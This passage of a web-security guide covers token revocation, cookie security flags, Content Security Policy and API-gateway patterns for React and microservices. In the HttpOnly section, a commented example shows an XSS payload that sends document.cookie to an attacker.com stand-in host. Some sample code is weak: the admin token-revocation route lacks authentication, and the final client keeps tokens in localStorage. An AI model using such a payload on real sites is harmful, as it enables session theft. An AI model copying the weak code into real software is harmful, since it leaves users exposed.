    <AuthContext.Provider value={{ accessToken, setAccessToken }}>
      {children}
    </AuthContext.Provider>
  );
}
```

---

### Token Revocation

```javascript
// Logout: Revoke refresh token
app.post('/api/auth/logout', authenticateAccessToken, async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  // Remove from database
  await RefreshToken.deleteOne({ token: refreshToken });
  
  // Clear cookies
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  
  res.json({ message: 'Logged out' });
});

// Revoke all sessions for user (logout from all devices)
app.post('/api/auth/logout-all', authenticateAccessToken, async (req, res) => {
  await RefreshToken.deleteMany({ userId: req.user.userId });
  
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  
  res.json({ message: 'Logged out from all devices' });
});

// Admin: Revoke specific user's tokens
app.post('/api/admin/revoke-tokens/:userId', async (req, res) => {
  await RefreshToken.deleteMany({ userId: req.params.userId });
  res.json({ message: 'Tokens revoked' });
});
```

---

## Secure Cookie Flags

### Cookie Anatomy

```javascript
// Complete cookie with all security flags
res.cookie('sessionId', 'abc123', {
  httpOnly: true,      // Prevent XSS
  secure: true,        // HTTPS only
  sameSite: 'strict',  // Prevent CSRF
  maxAge: 3600000,     // 1 hour (in milliseconds)
  domain: '.example.com', // Cookie domain
  path: '/api',        // Cookie path
  signed: true         // Cryptographic signature
});

// Results in HTTP header:
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Domain=.example.com; Path=/api
```

---

### HttpOnly Flag

**Purpose**: Prevents JavaScript access to cookies

**Protection**: Mitigates XSS attacks

```javascript
// ✅ With HttpOnly
res.cookie('session', value, { httpOnly: true });
// JavaScript cannot access: document.cookie won't show this cookie
// Only sent in HTTP requests

// ❌ Without HttpOnly
res.cookie('session', value);
// Vulnerable:
// <script>
//   fetch('https://attacker.com/steal?cookie=' + document.cookie);
// </script>
```

**When to use**:
- ✅ Session tokens
- ✅ Authentication tokens
- ✅ Any sensitive data
- ❌ CSRF tokens (client needs to read them)
- ❌ User preferences (if client needs access)

**Example**:
```javascript
// Secure session cookie
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body);
  
  req.session.userId = user.id;
  
  res.cookie('sessionId', req.session.id, {
    httpOnly: true,  // JavaScript can't access
    secure: true,
    sameSite: 'strict'
  });
  
  res.json({ message: 'Logged in' });
});

// Client-side: cookie is automatically included
fetch('/api/data', {
  credentials: 'include' // Include cookies
});
// No need for client to handle the cookie
```

---

### Secure Flag

**Purpose**: Cookie only sent over HTTPS

**Protection**: Prevents man-in-the-middle attacks

```javascript
// ✅ Production: Always use Secure
res.cookie('token', value, { 
  secure: true // Only sent over HTTPS
});

// Development: Conditional secure flag
res.cookie('token', value, {
  secure: process.env.NODE_ENV === 'production'
});

// ❌ Without Secure flag
// Cookie sent over HTTP - vulnerable to interception
```

**Environment-aware configuration**:
```javascript
const cookieOptions = {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production', // true in prod, false in dev
  sameSite: process.env.NODE_ENV === 'production' ? 'strict' : 'lax'
};

app.use(session({
  cookie: cookieOptions,
  // ... other options
}));
```

---

### SameSite Flag

**Purpose**: Controls cross-site cookie behavior

**Protection**: Primary defense against CSRF attacks

**Values**: `Strict`, `Lax`, `None`

#### SameSite=Strict

**Behavior**: Cookie NEVER sent on cross-site requests

```javascript
res.cookie('session', value, { sameSite: 'strict' });

// ✅ Cookie sent:
// - User types example.com in address bar
// - User navigates within example.com
// - User bookmarks and visits example.com

// ❌ Cookie NOT sent:
// - User clicks link from another site → example.com
// - Form submission from another site → example.com
// - iframe/image/fetch from another site
```

**Use case**: High security applications
```javascript
// Banking application
res.cookie('bankSession', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // Maximum CSRF protection
});
```

**Limitation**: Poor UX - user appears logged out when clicking links from emails, social media, etc.

---

#### SameSite=Lax (Recommended Default)

**Behavior**: Cookie sent on top-level navigations (GET only)

```javascript
res.cookie('session', value, { sameSite: 'lax' });

// ✅ Cookie sent:
// - User types example.com in address bar
// - User navigates within example.com
// - User clicks link from another site → example.com (GET requests)
// - Anchor tag: <a href="example.com">

// ❌ Cookie NOT sent:
// - Form POST from another site → example.com
// - Ajax/fetch from another site
// - iframe/image from another site
```

**Balance of security and usability**:
```javascript
// E-commerce site
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax' // Good balance
});

// User clicks product link in email → logged in ✓
// CSRF attacks via POST → blocked ✓
```

---

#### SameSite=None

**Behavior**: Cookie sent on all cross-site requests

**Requirement**: MUST use `Secure` flag (HTTPS only)

```javascript
// ⚠️ Only use when necessary
res.cookie('tracking', value, {
  sameSite: 'none',
  secure: true // Required with SameSite=None
});

// Cookie sent in ALL scenarios:
// - Cross-origin iframes
// - Third-party integrations
// - Cross-site forms
// - All cross-origin requests
```

**Use cases**:
```javascript
// 1. Embedded widgets
// example.com embeds widget.com in iframe
res.cookie('widgetSession', value, {
  sameSite: 'none',
  secure: true
});

// 2. OAuth/SSO flows
res.cookie('oauthState', state, {
  sameSite: 'none',
  secure: true,
  maxAge: 600000 // 10 minutes
});

// 3. Payment processor integration
res.cookie('paymentSession', value, {
  sameSite: 'none',
  secure: true
});
```

---

### Comparison Table

| Scenario | Strict | Lax | None |
|----------|--------|-----|------|
| Direct navigation (type URL) | ✅ | ✅ | ✅ |
| Click link from email | ❌ | ✅ | ✅ |
| Click link from Google | ❌ | ✅ | ✅ |
| Form POST from other site | ❌ | ❌ | ✅ |
| iframe from other site | ❌ | ❌ | ✅ |
| Ajax from other site | ❌ | ❌ | ✅ |
| Image tag from other site | ❌ | ❌ | ✅ |

---

### Domain and Path

```javascript
// Domain: controls which domains can access cookie
res.cookie('shared', value, {
  domain: '.example.com' // Accessible by example.com and all subdomains
});
// Accessible by: example.com, app.example.com, api.example.com

res.cookie('specific', value, {
  domain: 'app.example.com' // Only this subdomain
});

// Path: controls which URLs can access cookie
res.cookie('api', value, {
  path: '/api' // Only sent to /api/* routes
});

res.cookie('admin', value, {
  path: '/admin' // Only sent to /admin/* routes
});
```

---

### MaxAge vs Expires

```javascript
// MaxAge: duration in milliseconds
res.cookie('session', value, {
  maxAge: 3600000 // 1 hour
});

// Expires: specific date
res.cookie('session', value, {
  expires: new Date(Date.now() + 3600000)
});

// Session cookie (deleted when browser closes)
res.cookie('temp', value); // No maxAge or expires

// Permanent cookie (1 year)
res.cookie('remember', value, {
  maxAge: 365 * 24 * 60 * 60 * 1000
});
```

---

### Signed Cookies

**Purpose**: Verify cookie integrity

```javascript
// Setup
const cookieParser = require('cookie-parser');
app.use(cookieParser(process.env.COOKIE_SECRET));

// Set signed cookie
res.cookie('user', userId, {
  signed: true, // Cryptographically signed
  httpOnly: true
});

// Read signed cookie
const userId = req.signedCookies.user;

// If tampered, returns undefined
if (!userId) {
  return res.status(400).json({ error: 'Invalid cookie' });
}
```

---

### Complete Secure Cookie Setup

```javascript
// Production-grade cookie configuration
const cookieConfig = {
  // Security flags
  httpOnly: true,      // Prevent XSS
  secure: true,        // HTTPS only
  sameSite: 'strict',  // Prevent CSRF
  signed: true,        // Verify integrity
  
  // Scope
  domain: process.env.COOKIE_DOMAIN, // '.example.com'
  path: '/',
  
  // Expiration
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
};

// Session cookie
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: '__Host-sessionId', // Prefix for extra security
  cookie: cookieConfig,
  store: new RedisStore({ client: redisClient })
}));

// CSRF token (needs to be readable by client)
app.get('/csrf-token', (req, res) => {
  const token = generateCsrfToken();
  
  res.cookie('csrf-token', token, {
    httpOnly: false, // Client needs to read it
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000 // 1 hour
  });
  
  res.json({ csrfToken: token });
});

// Remember me cookie
app.post('/login', (req, res) => {
  if (req.body.rememberMe) {
    res.cookie('rememberToken', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
      signed: true
    });
  }
});
```

---

### Cookie Prefixes

**Extra security through naming convention**:

```javascript
// __Secure- prefix: Cookie must have Secure flag
res.cookie('__Secure-token', value, {
  secure: true, // Required
  httpOnly: true
});

// __Host- prefix: Cookie must have Secure flag, no Domain, path=/
res.cookie('__Host-session', value, {
  secure: true,   // Required
  path: '/',      // Required
  // domain: not allowed
  httpOnly: true
});

// Browser enforces these constraints
// If constraints not met, cookie is rejected
```

---

## Content Security Policy (CSP)

### What is CSP?

Content Security Policy is an HTTP header that tells the browser which sources of content are trusted. It's a defense-in-depth mechanism against XSS, clickjacking, and code injection attacks.

**How it works**: Browser only executes/loads resources from whitelisted sources.

---

### Basic CSP Header

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self'"
  );
  next();
});

// Or use helmet.js
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'"]
  }
}));
```

---

### CSP Directives

#### default-src
**Fallback for all other directives**

```javascript
// Allow only from same origin
"default-src 'self'"

// Allow from multiple sources
"default-src 'self' https://api.example.com https://cdn.example.com"
```

#### script-src
**Controls JavaScript sources**

```javascript
// Only same-origin scripts
"script-src 'self'"

// Allow specific CDN
"script-src 'self' https://cdn.jsdelivr.net"

// Allow inline scripts (NOT RECOMMENDED)
"script-src 'self' 'unsafe-inline'"

// Allow eval (NOT RECOMMENDED)
"script-src 'self' 'unsafe-eval'"

// Use nonces for inline scripts (RECOMMENDED)
"script-src 'self' 'nonce-{RANDOM}'"

// Use hashes for inline scripts (RECOMMENDED)
"script-src 'self' 'sha256-{HASH}'"
```

**Nonce example**:
```javascript
// Backend: Generate nonce
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

// Send nonce to template
res.render('page', { nonce });

// Frontend: Use nonce in script tags
<script nonce="<%= nonce %>">
  console.log('This script is allowed');
</script>

// Without nonce: blocked
<script>
  console.log('This script is blocked');
</script>
```

**Hash example**:
```javascript
// Calculate hash of inline script
const crypto = require('crypto');
const script = "console.log('hello')";
const hash = crypto.createHash('sha256').update(script).digest('base64');

// Add to CSP
`script-src 'self' 'sha256-${hash}'`

// This exact script will be allowed:
<script>console.log('hello')</script>
```

#### style-src
**Controls CSS sources**

```javascript
// Only same-origin styles
"style-src 'self'"

// Allow Google Fonts
"style-src 'self' https://fonts.googleapis.com"

// Allow inline styles (with nonce)
"style-src 'self' 'nonce-{RANDOM}'"
```

#### img-src
**Controls image sources**

```javascript
// Allow images from CDN and data URIs
"img-src 'self' https://cdn.example.com data:"

// Allow all images (not recommended)
"img-src *"
```

#### connect-src
**Controls Ajax, WebSocket, fetch**

```javascript
// Allow API calls to specific endpoints
"connect-src 'self' https://api.example.com wss://websocket.example.com"

// React app calling API
"connect-src 'self' https://api.backend.com"
```

#### font-src
**Controls font sources**

```javascript
// Allow Google Fonts
"font-src 'self' https://fonts.gstatic.com"
```

#### frame-src
**Controls iframe sources**

```javascript
// Block all iframes
"frame-src 'none'"

// Allow YouTube embeds
"frame-src 'self' https://www.youtube.com"
```

#### frame-ancestors
**Controls who can embed your site in iframe**

```javascript
// Prevent clickjacking - no one can iframe your site
"frame-ancestors 'none'"

// Allow only same origin
"frame-ancestors 'self'"

// Allow specific domains
"frame-ancestors https://trusted.com"
```

---

### Complete CSP Example

```javascript
// Comprehensive CSP for React application
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    // Default fallback
    defaultSrc: ["'self'"],
    
    // Scripts: self + specific CDNs + nonce for inline
    scriptSrc: [
      "'self'",
      "https://cdn.jsdelivr.net",
      "https://cdnjs.cloudflare.com",
      (req, res) => `'nonce-${res.locals.nonce}'` // Dynamic nonce
    ],
    
    // Styles: self + Google Fonts + nonce for inline
    styleSrc: [
      "'self'",
      "https://fonts.googleapis.com",
      (req, res) => `'nonce-${res.locals.nonce}'`
    ],
    
    // Images: self + CDN + data URIs (for inline images)
    imgSrc: [
      "'self'",
      "https://cdn.example.com",
      "data:",
      "blob:"
    ],
    
    // Fonts: self + Google Fonts
    fontSrc: [
      "'self'",
      "https://fonts.gstatic.com"
    ],
    
    // API calls: self + backend API
    connectSrc: [
      "'self'",
      "https://api.example.com",
      "wss://websocket.example.com"
    ],
    
    // Media: self + CDN
    mediaSrc: ["'self'", "https://media.example.com"],
    
    // iframes: YouTube only
    frameSrc: ["https://www.youtube.com"],
    
    // Prevent others from iframing your site
    frameAncestors: ["'none'"],
    
    // Form submissions: self only
    formAction: ["'self'"],
    
    // Block plugins (Flash, etc.)
    objectSrc: ["'none'"],
    
    // Upgrade HTTP to HTTPS
    upgradeInsecureRequests: []
  }
}));

// Middleware to generate nonce per request
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});
```

---

### CSP for Single Page Applications (React, Vue, Angular)

```javascript
// React app with CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    
    // React needs 'unsafe-eval' in development (create-react-app)
    // In production, build process removes this need
    scriptSrc: [
      "'self'",
      process.env.NODE_ENV === 'development' ? "'unsafe-eval'" : ""
    ].filter(Boolean),
    
    styleSrc: [
      "'self'",
      "'unsafe-inline'" // React inline styles, consider nonce instead
    ],
    
    imgSrc: ["'self'", "data:", "blob:"],
    
    connectSrc: [
      "'self'",
      "https://api.example.com"
    ],
    
    fontSrc: ["'self'"],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"]
  }
}));
```

---

### CSP Reporting

**Monitor violations without blocking**:

```javascript
// Report-Only mode: log violations, don't block
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; report-uri /csp-violation-report"
  );
  next();
});

// Endpoint to receive violation reports
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body);
  
  // Log to monitoring service
  logger.warn('CSP Violation', {
    documentUri: req.body['csp-report']['document-uri'],
    violatedDirective: req.body['csp-report']['violated-directive'],
    blockedUri: req.body['csp-report']['blocked-uri'],
    sourceFile: req.body['csp-report']['source-file'],
    lineNumber: req.body['csp-report']['line-number']
  });
  
  res.status(204).end();
});

// Modern: report-to API
res.setHeader('Report-To', JSON.stringify({
  group: 'csp-endpoint',
  max_age: 10886400,
  endpoints: [{ url: 'https://example.com/csp-reports' }]
}));

res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; report-to csp-endpoint"
);
```

**Example violation report**:
```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/malicious.js",
    "source-file": "https://example.com/page",
    "line-number": 42,
    "column-number": 12,
    "status-code": 200
  }
}
```

---

### CSP Best Practices

#### 1. Start with Report-Only
```javascript
// Phase 1: Monitor violations
'Content-Security-Policy-Report-Only'

// Phase 2: Fix violations

// Phase 3: Enforce
'Content-Security-Policy'
```

#### 2. Avoid 'unsafe-inline' and 'unsafe-eval'
```javascript
// ❌ Bad: Allows inline scripts (defeats CSP purpose)
"script-src 'self' 'unsafe-inline'"

// ✅ Good: Use nonces or hashes
"script-src 'self' 'nonce-{RANDOM}'"
```

#### 3. Use Strict CSP
```javascript
// Google's Strict CSP approach
const strictCSP = {
  scriptSrc: [
    "'strict-dynamic'",
    "'nonce-{RANDOM}'",
    "'unsafe-inline'", // Fallback for old browsers
    "https:", // Fallback for old browsers
    "http:"   // Fallback for old browsers
  ],
  objectSrc: ["'none'"],
  baseUri: ["'none'"]
};

// Modern browsers use nonce + strict-dynamic
// Old browsers fall back to https:/http:
```

#### 4. Frame-Ancestors for Clickjacking
```javascript
// Prevent your site from being iframed
"frame-ancestors 'none'"

// X-Frame-Options is older but still useful
res.setHeader('X-Frame-Options', 'DENY');
```

---

### Testing CSP

```javascript
// Browser console: Check CSP
// Open DevTools → Console
// Look for CSP violation messages

// Example violation:
// "Refused to load the script 'https://evil.com/script.js' 
//  because it violates the following Content Security Policy directive: 
//  "script-src 'self'""

// Online tools:
// - CSP Evaluator: https://csp-evaluator.withgoogle.com
// - Report URI: https://report-uri.com

// Test with curl
curl -I https://example.com | grep -i content-security-policy
```

---

## Microservices Frontend Security

### Security Challenges in Microservices

```
┌─────────────────────────────────────────────────────────┐
│                    Frontend (SPA)                       │
│              https://app.example.com                    │
└────────────┬───────────┬────────────┬──────────────────┘
             │           │            │
             ▼           ▼            ▼
    ┌────────────┐ ┌──────────┐ ┌──────────┐
    │  Auth API  │ │ User API │ │ Order API│
    │  :3001     │ │  :3002   │ │  :3003   │
    └────────────┘ └──────────┘ └──────────┘

Challenges:
1. Multiple APIs, different origins → CORS complexity
2. Token management across services
3. Consistent authentication/authorization
4. API Gateway vs direct service calls
5. Service-to-service security
```

---

### Architecture Pattern 1: API Gateway

**Recommended approach for frontend security**

```
┌──────────────────────┐
│   Frontend (SPA)     │
│  app.example.com     │
└──────────┬───────────┘
           │ Single origin
           │ Simple CORS
           ▼
┌──────────────────────┐
│    API Gateway       │
│ gateway.example.com  │
│  - Authentication    │
│  - Rate limiting     │
│  - Request routing   │
│  - Response caching  │
└──────────┬───────────┘
           │
    ┌──────┴──────┬──────────┐
    ▼             ▼          ▼
┌────────┐  ┌─────────┐  ┌──────────┐
│Auth API│  │User API │  │Order API │
└────────┘  └─────────┘  └──────────┘
```

#### API Gateway Implementation

```javascript
// API Gateway (Node.js with http-proxy-middleware)
const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');

const app = express();

// CORS configuration (single origin)
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use('/api/', limiter);

// Authentication middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Invalid token' });
    }
    
    // Add user to request for downstream services
    req.user = user;
    req.headers['x-user-id'] = user.id;
    req.headers['x-user-email'] = user.email;
    
    next();
  });
}

// Public routes (no auth needed)
app.use('/api/auth', createProxyMiddleware({
  target: 'http://auth-service:3001',
  changeOrigin: true,
  pathRewrite: { '^/api/auth': '' }
}));

// Protected routes
app.use('/api/users', 
  authenticateToken,
  createProxyMiddleware({
    target: 'http://user-service:3002',
    changeOrigin: true,
    pathRewrite: { '^/api/users': '' },
    onProxyReq: (proxyReq, req) => {
      // Forward user context to service
      proxyReq.setHeader('X-User-Id', req.user.id);
      proxyReq.setHeader('X-User-Email', req.user.email);
      proxyReq.setHeader('X-User-Roles', JSON.stringify(req.user.roles));
    }
  })
);

app.use('/api/orders',
  authenticateToken,
  createProxyMiddleware({
    target: 'http://order-service:3003',
    changeOrigin: true,
    pathRewrite: { '^/api/orders': '' }
  })
);

// Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.example.com"],
      connectSrc: ["'self'", "https://gateway.example.com"]
    }
  }
}));

app.listen(8080);
```

#### Frontend: Single API Endpoint

```javascript
// React app - only talks to API Gateway
const API_BASE = 'https://gateway.example.com/api';

// Auth service
export const authAPI = {
  login: (credentials) => 
    fetch(`${API_BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    }),
    
  logout: () => 
    fetch(`${API_BASE}/auth/logout`, { method: 'POST' })
};

// User service
export const userAPI = {
  getProfile: () => 
    fetch(`${API_BASE}/users/profile`, {
      headers: { 'Authorization': `Bearer ${getToken()}` }
    }),
    
  updateProfile: (data) => 
    fetch(`${API_BASE}/users/profile`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${getToken()}`
      },
      body: JSON.stringify(data)
    })
};

// Order service
export const orderAPI = {
  getOrders: () => 
    fetch(`${API_BASE}/orders`, {
      headers: { 'Authorization': `Bearer ${getToken()}` }
    })
};

// Axios instance for all services
const api = axios.create({
  baseURL: API_BASE,
  timeout: 10000
});

api.interceptors.request.use(config => {
  const token = getToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Simple usage
async function loadDashboard() {
  const [profile, orders] = await Promise.all([
    api.get('/users/profile'),
    api.get('/orders')
  ]);
  
  return { profile: profile.data, orders: orders.data };
}
```

---

### Architecture Pattern 2: Backend for Frontend (BFF)

**When different clients need different data shapes**

```
┌───────────┐      ┌────────────┐      ┌──────────┐
│  Web App  │      │ Mobile App │      │ Admin UI │
└─────┬─────┘      └──────┬─────┘      └────┬─────┘
      │                   │                   │
      ▼                   ▼                   ▼
┌────────────┐      ┌──────────────┐   ┌───────────┐
│  Web BFF   │      │  Mobile BFF  │   │ Admin BFF │
│ (GraphQL)  │      │   (REST)     │   │  (REST)   │
└─────┬──────┘      └──────┬───────┘   └─────┬─────┘
      │                    │                   │
      └────────────────────┴───────────────────┘
                           │
                ┌──────────┴──────────┐
                ▼                     ▼
         ┌────────────┐        ┌──────────┐
         │  User API  │        │Order API │
         └────────────┘        └──────────┘
```

#### BFF Implementation

```javascript
// Web BFF (GraphQL)
const { ApolloServer, gql } = require('apollo-server-express');

const typeDefs = gql`
  type User {
    id: ID!
    email: String!
    profile: Profile!
  }
  
  type Profile {
    name: String!
    avatar: String
  }
  
  type Order {
    id: ID!
    status: String!
    items: [OrderItem!]!
  }
  
  type Query {
    me: User
    myOrders: [Order!]!
  }
`;

const resolvers = {
  Query: {
    me: async (_, __, { user, dataSources }) => {
      // BFF aggregates data from multiple services
      return dataSources.userAPI.getUser(user.id);
    },
    
    myOrders: async (_, __, { user, dataSources }) => {
      return dataSources.orderAPI.getUserOrders(user.id);
    }
  }
};

// Data sources for backend services
class UserAPI extends RESTDataSource {
  constructor() {
    super();
    this.baseURL = 'http://user-service:3002';
  }
  
  willSendRequest(request) {
    // Forward auth token to service
    request.headers.set('Authorization', this.context.token);
  }
  
  async getUser(id) {
    return this.get(`/users/${id}`);
  }
}

const server = new ApolloServer({
  typeDefs,
  resolvers,
  dataSources: () => ({
    userAPI: new UserAPI(),
    orderAPI: new OrderAPI()
  }),
  context: ({ req }) => {
    const token = req.headers.authorization;
    const user = verifyToken(token);
    
    return { user, token };
  }
});

// Frontend: Clean GraphQL queries
function Dashboard() {
  const { loading, data } = useQuery(gql`
    query {
      me {
        email
        profile {
          name
          avatar
        }
      }
      myOrders {
        id
        status
      }
    }
  `);
  
  if (loading) return <Spinner />;
  
  return (
    <div>
      <h1>Welcome, {data.me.profile.name}</h1>
      <OrderList orders={data.myOrders} />
    </div>
  );
}
```

---

### Token Propagation in Microservices

#### Pattern 1: Token Forwarding (JWT)

```javascript
// Frontend → Gateway → Services
// JWT passed through entire chain

// API Gateway
app.use('/api/users', authenticateToken, (req, res, next) => {
  // Forward token to service
  proxy.web(req, res, {
    target: 'http://user-service:3002',
    headers: {
      'Authorization': req.headers.authorization
    }
  });
});

// User Service
function authenticateService(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    const user = jwt.verify(token, process.env.JWT_SECRET);
    req.user = user;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
}

app.get('/users/:id', authenticateService, (req, res) => {
  // User context available from token
  res.json({ user: req.user });
});
```

#### Pattern 2: Token Exchange

```javascript
// Gateway validates user token, issues service token

// API Gateway
app.use('/api/users', authenticateToken, (req, res, next) => {
  // Generate service-to-service token
  const serviceToken = jwt.sign(
    {
      userId: req.user.id,
      service: 'gateway',
      scope: 'user-service'
    },
    process.env.SERVICE_TOKEN_SECRET,
    { expiresIn: '5m' } // Short-lived
  );
  
  proxy.web(req, res, {
    target: 'http://user-service:3002',
    headers: {
      'X-Service-Token': serviceToken,
      'X-User-Id': req.user.id
    }
  });
});

// User Service
function authenticateServiceToken(req, res, next) {
  const token = req.headers['x-service-token'];
  
  try {
    const payload = jwt.verify(token, process.env.SERVICE_TOKEN_SECRET);
    
    if (payload.scope !== 'user-service') {
      return res.status(403).json({ error: 'Invalid scope' });
    }
    
    req.user = { id: req.headers['x-user-id'] };
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid service token' });
  }
}
```

---

### CORS Configuration for Microservices

#### Without API Gateway (Multiple Origins)

```javascript
// Frontend needs to call multiple services directly
// Each service needs CORS configuration

// Auth Service (port 3001)
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true
}));

// User Service (port 3002)
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true
}));

// Order Service (port 3003)
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true
}));

// Frontend needs multiple base URLs
const AUTH_API = 'https://auth.example.com';
const USER_API = 'https://user.example.com';
const ORDER_API = 'https://order.example.com';

// Complex CSP with multiple connect-src
Content-Security-Policy: connect-src 'self' https://auth.example.com https://user.example.com https://order.example.com
```

#### With API Gateway (Single Origin)

```javascript
// Only gateway needs CORS
// Services can be private (no CORS)

// API Gateway
app.use(cors({
  origin: 'https://app.example.com',
  credentials: true
}));

// Services (no CORS needed - only gateway calls them)
// Auth Service
app.use((req, res, next) => {
  // Only accept requests from gateway
  const callerIP = req.ip;
  const allowedIPs = ['10.0.1.100']; // Gateway IP
  
  if (!allowedIPs.includes(callerIP)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  next();
});

// Frontend: Single origin
const API_BASE = 'https://gateway.example.com';

// Simple CSP
Content-Security-Policy: connect-src 'self' https://gateway.example.com
```

---

### Service Mesh Pattern (Advanced)

```javascript
// Istio/Linkerd handle service-to-service security
// Frontend → Gateway → Service Mesh → Services

// Mutual TLS between services (automatic)
// No need for JWT validation in each service

// Gateway configuration
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: api-gateway
spec:
  hosts:
  - gateway.example.com
  http:
  - match:
    - uri:
        prefix: /api/users
    route:
    - destination:
        host: user-service
        port:
          number: 3002
    headers:
      request:
        add:
          x-user-id: ${user.id}
```

---

### Security Best Practices for Microservices Frontend

```javascript
// 1. Use API Gateway
// - Single entry point
// - Centralized auth
// - Rate limiting
// - Request/response transformation

// 2. Token Management
// - Gateway validates user tokens
// - Services trust gateway
// - Use short-lived tokens
// - Implement token refresh

// 3. CORS Strategy
// - With Gateway: Configure only on gateway
// - Without Gateway: Consistent CORS on all services
// - Never use "*" for credentials: true

// 4. CSP Configuration
// - Whitelist only gateway endpoint
connect-src: ['self', 'https://gateway.example.com']

// 5. Service-to-Service Auth
// - Don't expose services publicly
// - Use service tokens or mTLS
// - Network isolation (VPC, service mesh)

// 6. Rate Limiting
// - At gateway level (per user/IP)
// - At service level (per consumer)

// 7. Error Handling
// - Don't leak service details in errors
// - Generic messages to frontend

// 8. Logging & Monitoring
// - Trace requests across services (correlation ID)
// - Monitor auth failures
// - Alert on suspicious patterns
```

---

### Complete Example: Secure React App with Microservices

```javascript
// Frontend (React)
// src/api/client.js
import axios from 'axios';

const API_BASE = process.env.REACT_APP_API_GATEWAY;

const apiClient = axios.create({
  baseURL: API_BASE,
  timeout: 10000,
  withCredentials: true
});

// Request interceptor
apiClient.interceptors.request.use(
  config => {
    const token = localStorage.getItem('accessToken');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    
    // Correlation ID for tracing
    config.headers['X-Correlation-ID'] = generateUUID();
    
    return config;
  },
  error => Promise.reject(error)
);

// Response interceptor
apiClient.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // Handle token expiration
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      
      try {
        const { data } = await axios.post(
          `${API_BASE}/auth/refresh`,
          {},
          { withCredentials: true }
        );
        
        localStorage.setItem('accessToken', data.accessToken);
        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
        
        return apiClient(originalRequest);
      } catch (refreshError) {
        // Redirect to login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);

export default apiClient;

// src/services/userService.js
export const userService = {
  getProfile: () => apiClient.get('/users/profile'),
  updateProfile: (data) => apiClient.put('/users/profile', data),
  getSettings: () => apiClient.get('/users/settings')
};

// src/services/orderService.js
export const orderService = {
  getOrders: () => apiClient.get('/orders'),
  createOrder: (order) => apiClient.post('/orders', order),
  getOrder: (id) => apiClient.get(`/orders/${id}`)
};

// Usage in component
function Dashboard() {
  const [profile, setProfile] = useState(null);
  const [orders, setOrders] = useState([]);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    Promise.all([
      userService.getProfile(),
      orderService.getOrders()
    ])
      .then(([profileRes, ordersRes]) => {
        setProfile(profileRes.data);
        setOrders(ordersRes.data);
      })
      .catch(error => {
        console.error('Error loading dashboard:', error);
      })
      .finally(() => {
        setLoading(false);
      });
  }, []);
  
  if (loading) return <Spinner />;
  
  return (
    <div>
      <h1>Welcome, {profile.name}</h1>
      <OrderList orders={orders} />
    </div>
  );
}
```

---

## Summary Checklist

### XSS Prevention
- ✅ Validate and sanitize all user input
- ✅ Use React's automatic escaping (avoid `dangerouslySetInnerHTML`)
- ✅ Use DOMPurify for rendering HTML
- ✅ Implement CSP headers
- ✅ Avoid `eval()`, `innerHTML`, `document.write()`

